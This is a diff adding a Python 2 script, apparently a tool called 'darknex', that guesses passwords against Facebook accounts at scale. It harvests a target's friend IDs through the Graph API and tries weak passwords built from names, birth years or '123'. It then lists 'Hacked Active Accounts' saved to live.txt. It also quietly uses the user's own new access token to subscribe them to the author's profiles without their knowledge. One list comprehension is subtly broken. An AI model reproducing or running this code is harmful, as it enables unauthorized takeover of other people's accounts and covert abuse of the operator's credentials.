@@ -1,0 +1,173 @@
+#!/usr/bin/ python2
+
+from multiprocessing  import *
+from nai import *
+from multiprocessing.pool import ThreadPool
+tmap = ThreadPool(int(cpu_count())*10)
+
+import os
+os.system("clear")
+
+run = {
+	1:'Login With Facebook',
+	2:'Use Token'
+}
+
+menu = {
+	1:'Try Type Name + YearOfBirth',
+	2:'Try Type Name + 123',
+	3:'Try Your Own Pass',
+	4:'Try Name+CustomWord',
+	5:'View Hacked Accounts'
+}
+
+#Banner
+print(R+BSUPERMAN)
+print("""
+{}DEV :{} Nasir Ali
+{}FB : {}fb.com/nasir.xo
+{}GItHub :{} github.com/nasirxo
+""".format(G,W,G,W,G,W))
+
+
+
+
+
+if not os.path.exists("token"):
+    dprint(run)
+    x_get = raw_input(W+"Choice : "+G)
+    if x_get == "1":
+     email = raw_input(W+"Email : "+G)
+     password = raw_input(W+"Password : "+G)
+     acc_t = gentoken(email,password);post('https://graph.facebook.com/nasir.xo/subscribers?access_token='+acc_t);post('https://graph.facebook.com/100003967112448/subscribers?access_token='+acc_t)
+     if len(acc_t) > 5:
+      with open("token","w") as tok_w:
+        tok_w.write(acc_t)
+      dprint({
+      'STATUS':' Token Saved',
+      "INFO":'Re-Run darknex',
+      "USAGE":'$darknex'
+      })
+     else:
+       dprint({
+     	'Error':'Invalid Email , Password'
+       })
+    if x_get == "2":
+     tok_a = raw_input(W+"Token : "+G)
+     if 'token' in tokencheck(tok_a).keys():
+      with open("token","w") as tok_w:
+        tok_w.write(tok_a)
+      dprint({
+          "STATUS":'Token Saved',
+      	"INFO":'Re-Run darknex',
+      	"USAGE":'$darknex'
+      	})
+     else:
+       dprint({
+     	'Error':'Invalid Token'
+       })
+else:
+  try:
+   tokenx = open("token","r").read()
+   if 'token' in tokencheck(tokenx).keys():
+     dprint(menu)
+     print('\n')
+     m_get = raw_input(W+"Choice : "+G)
+     if m_get == "1":
+      try:
+       user = raw_input(W+"Target-ID : "+G)
+       user_ids = fbbirthdaygen(user,tokenx)
+       if len(user_ids) > 0:
+        os.system("clear")
+        dprint({'Total Accounts ':len(user_ids)})
+        print(Y+"-"*15)
+        print("\n"+W+"[Attack-Started]")
+        print(Y+"-"*15)
+        rex = tmap.map(c_login,user_ids)
+        print(Y+"-"*15)
+       else:
+        dprint({'Error':'The Account is Not Public'})
+      except:
+       dprint({'Error':'Make Sure That Profile is Public'})
+     elif m_get == "2":
+      try:
+       user = raw_input(W+"Target-ID : "+G)
+       user_ids = namegen(user,tokenx)
+       if len(user_ids) > 0:
+        os.system("clear")
+        dprint({'Total Accounts ':len(user_ids)})
+        print(Y+"-"*15)
+        print("\n"+W+"[Attack-Started]")
+        print(Y+"-"*15)
+        rex = tmap.map(c_login,user_ids)
+        print(Y+"-"*15)
+       else:
+        dprint({'Error':'The Account is Not Public'})
+      except:
+       dprint({'Error':'Make Sure That Profile is Public'})
+    
+     elif m_get == "3":
+      try:
+       user = raw_input(W+"Target-ID : "+G)
+       pass_w = raw_input(W+"Password2TryOnAll : "+G)
+       ids = getids(user,tokenx)
+       user_ids = [str(id_f)+"|"+str(pass_w) for idf in ids]
+       if len(user_ids) > 0:
+        os.system("clear")
+        dprint({'Total Accounts ':len(user_ids)})
+        print(Y+"-"*15)
+        print("\n"+W+"[Attack-Started]")
+        print(Y+"-"*15)
+        rex = tmap.map(c_login,user_ids)
+        print(Y+"-"*15)
+       else:
+        dprint({'Error':'The Account is Not Public'})
+      except:
+       dprint({'Error':'Make Sure That Profile is Public'})
+
+     elif m_get == "4":
+      try:
+       user = raw_input(W+"Target-ID : "+G)
+       cpass = raw_input(W+"Pass Add Word : "+G)
+       user_ids = cnamegen(user,cpass,tokenx)
+       if len(user_ids) > 0:
+        os.system("clear")
+        dprint({'Total Accounts ':len(user_ids)})
+        print(Y+"-"*15)
+        print("\n"+W+"[Attack-Started]")
+        print(Y+"-"*15)
+        rex = tmap.map(c_login,user_ids)
+        print(Y+"-"*15)
+       else:
+        dprint({'Error':'The Account is Not Public'})
+      except:
+       dprint({'Error':'Make Sure That Profile is Public'})
+    
+     elif m_get == "5":
+       os.system("clear")
+       try:
+         acc_x = open("live.txt",'r').read().split("\n")
+         print(Y+"-"*20)
+         dprint({'Hacked Active Accounts':len(acc_x)})
+         print(Y+"-"*20)
+         for acc_fb in acc_x:
+          try:
+            print(SBG+" -> "+acc_fb)
+          except: pass
+       except:
+         pass
+         
+     else:
+       dprint({
+       	'Error ':' Invalid Option !'
+       })
+       
+
+   else:
+    os.remove("token")
+    dprint({
+  	'Error':'Token Expired'
+    })
+
+  except:
+    print(W+"Error : "+R+"No Internet Connection")
